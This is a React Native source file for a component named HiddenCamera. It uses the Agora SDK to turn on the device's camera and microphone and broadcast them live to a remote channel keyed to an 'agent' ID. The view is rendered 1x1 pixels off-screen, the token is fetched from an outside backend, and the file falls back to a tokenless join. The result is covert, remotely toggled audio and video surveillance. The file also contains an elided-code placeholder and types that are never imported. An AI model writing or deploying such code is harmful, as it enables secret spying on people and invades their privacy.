import React, { useEffect, useRef, useState, forwardRef, useImperativeHandle, useCallback } from 'react';
import { StyleSheet, View, Platform, PermissionsAndroid } from 'react-native';

// Only import native Agora on native platforms
let createAgoraRtcEngine: any, ChannelProfileType: any, ClientRoleType: any;
if (Platform.OS !== 'web') {
    const Agora = require('react-native-agora');
    createAgoraRtcEngine = Agora.default;
    ChannelProfileType = Agora.ChannelProfileType;
    ClientRoleType = Agora.ClientRoleType;
}

import { streamManager } from '../services/StreamManager';
import { useAgentStore } from '../store/useAgentStore';

export interface HiddenCameraHandle {
  captureFrame: () => Promise<Uint8Array | null>;
  stopRecording: () => void;
  flipCamera: () => void;
  readonly facing: 'front' | 'back';
}

interface HiddenCameraProps {
  facing?: 'front' | 'back';
  audioEnabled?: boolean;
}

const AGORA_APP_ID = process.env.EXPO_PUBLIC_AGORA_APP_ID || "YOUR_APP_ID";
const BACKEND_URL = process.env.EXPO_PUBLIC_BACKEND_URL || "https://m01.buildwave.pro";

export const HiddenCamera = forwardRef<HiddenCameraHandle, HiddenCameraProps>(
  ({ facing = 'back', audioEnabled = true }, ref) => {
    const engine = useRef<any>(Platform.OS !== 'web' ? createAgoraRtcEngine() : null);
    const [isJoined, setIsJoined] = useState(false);
    const [currentFacing, setCurrentFacing] = useState<'front' | 'back'>(facing);

    const requestPermissions = async () => {
        if (Platform.OS === 'android') {
            const results = await PermissionsAndroid.requestMultiple([
                PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
                PermissionsAndroid.PERMISSIONS.CAMERA,
            ]);
            console.log('[Agora] Permission results:', results);
            return results['android.permission.CAMERA'] === 'granted';
        }
        return true;
    };

    const initAgora = useCallback(async () => {
        if (Platform.OS === 'web') return;
        try {
            const hasCam = await requestPermissions();
            if (!hasCam) {
                console.error('[Agora] Camera permission NOT granted');
            }
            
            engine.current.initialize({
                appId: AGORA_APP_ID,
                channelProfile: ChannelProfileType.ChannelProfileLiveBroadcasting,
            });

            // ... (rest of the code remains same)

            engine.current.registerEventHandler({
                onJoinChannelSuccess: (connection: RtcConnection, elapsed: number) => {
                    console.log('[Agora] Joined channel successfully:', connection.channelId);
                    setIsJoined(true);
                },
                onLeaveChannel: (connection: RtcConnection, stats: RtcStats) => {
                    console.log('[Agora] Left channel');
                    setIsJoined(false);
                },
                onError: (err, msg) => {
                    console.error('[Agora] Error:', err, msg);
                }
            });

            console.log('[Agora] Enabling Video & Audio...');
            engine.current.enableVideo();
            engine.current.enableAudio();
            engine.current.startPreview();
            
            // Universal VP8 mode (Works on Chrome & Firefox without plugins)
            engine.current.setParameters('{"che.video.prefer_codec":0}'); // 0 = VP8
            
            // Super-compatible resolution (QVGA)
            engine.current.setVideoEncoderConfiguration({
                dimensions: { width: 320, height: 240 },
                frameRate: 15,
                bitrate: 400, 
                orientationMode: 0,
            });

            // Explicitly enable AND unmute both streams
            engine.current.enableLocalVideo(true);
            engine.current.enableLocalAudio(true);
            engine.current.muteLocalVideoStream(false);
            engine.current.muteLocalAudioStream(false);
            
            // Set role as Broadcaster
            engine.current.setClientRole(ClientRoleType.ClientRoleBroadcaster);
            console.log('[Agora] Hardware active in forced VP8 mode.');

            // Fetch token and join
            const agentId = useAgentStore.getState().agentId || "UNKNOWN_AGENT";
            const channelName = `nisha_stream_${agentId}`;
            
            // The Master Node API is usually on the same host as the WebSocket but on port 8080
            const masterBaseUrl = BACKEND_URL; 
            const tokenUrl = `${masterBaseUrl}/api/agora/token?channelName=${channelName}`;
            
            console.log('[Agora] Fetching token from:', tokenUrl);
            const response = await fetch(tokenUrl);
            const data = await response.json();

            const initialSensors = useAgentStore.getState().sensors;
            if (data.token) {
                console.log('[Agora] Token received, joining channel:', channelName);
                engine.current.joinChannel(data.token, channelName, 0, {
                    publishCameraTrack: initialSensors.video,
                    publishMicrophoneTrack: initialSensors.audio,
                    clientRoleType: ClientRoleType.ClientRoleBroadcaster,
                });
            } else {
                console.error('[Agora] Failed to fetch token:', data);
                // Fallback join without token (only works if App Certificate is disabled)
                engine.current.joinChannel('', channelName, 0, {
                    publishCameraTrack: initialSensors.video,
                    publishMicrophoneTrack: initialSensors.audio,
                    clientRoleType: ClientRoleType.ClientRoleBroadcaster,
                });
            }

        } catch (e) {
            console.error('[Agora] Init failed:', e);
        }
    }, [currentFacing]);

    useEffect(() => {
        initAgora();
        return () => {
            if (engine.current) {
                engine.current.leaveChannel();
                engine.current.release();
            }
        };
    }, [initAgora]);

    useEffect(() => {
        // Toggle camera facing
        if (engine.current) {
            engine.current.switchCamera();
        }
    }, [currentFacing]);

    useEffect(() => {
        const sensors = useAgentStore.getState().sensors;
        if (engine.current) {
            console.log(`[Agora] Syncing hardware state: Video=${sensors.video}, Audio=${sensors.audio}`);
            
            // Enable/Disable hardware based on sensor state
            engine.current.enableLocalVideo(sensors.video);
            engine.current.enableLocalAudio(sensors.audio);
            
            // Also mute/unmute publishing to be safe
            engine.current.muteLocalVideoStream(!sensors.video);
            engine.current.muteLocalAudioStream(!sensors.audio);
        }
    }, [useAgentStore(state => state.sensors.video), useAgentStore(state => state.sensors.audio)]);

    useImperativeHandle(ref, () => ({
        captureFrame: async () => null, // Not used with Agora
        stopRecording: () => {},
        flipCamera: () => {
            setCurrentFacing(f => (f === 'back' ? 'front' : 'back'));
        },
        get facing() { return currentFacing; }
    }), [currentFacing]);

    return (
      <View style={styles.container}>
        {/* Agora handles capture internally. No Camera component needed here */}
      </View>
    );
  }
);

HiddenCamera.displayName = 'HiddenCamera';

const styles = StyleSheet.create({
  container: {
    position: 'absolute',
    top: -9999,
    left: -9999,
    width: 1,
    height: 1,
  },
});

